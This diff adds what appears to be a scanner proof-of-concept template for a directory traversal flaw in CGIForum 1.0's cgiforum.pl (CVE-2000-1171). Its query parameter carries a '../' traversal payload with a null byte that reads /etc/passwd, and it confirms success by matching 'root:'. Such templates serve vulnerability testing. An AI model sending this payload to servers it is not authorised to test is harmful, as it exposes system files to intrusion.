@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 CGIForum 1.0 的 cgiforum.pl 脚本是否存在目录遍历漏洞。通过在 thesection 参数中注入 ../ 路径遍历序列，尝试读取服务器上的 /etc/passwd 文件，若返回文件内容则说明漏洞存在。"
+id = "POC-AVE-2000-0827"
+name = "CGIForum 1.0 thesection 目录遍历漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0827"]
+vuln_id = [
+    "CVE-2000-1171",
+    "AVE-2000-0827",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/cgiforum.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["root:"]
+
+[poc.requests.query]
+thesection = "../../../../../../etc/passwd%00"
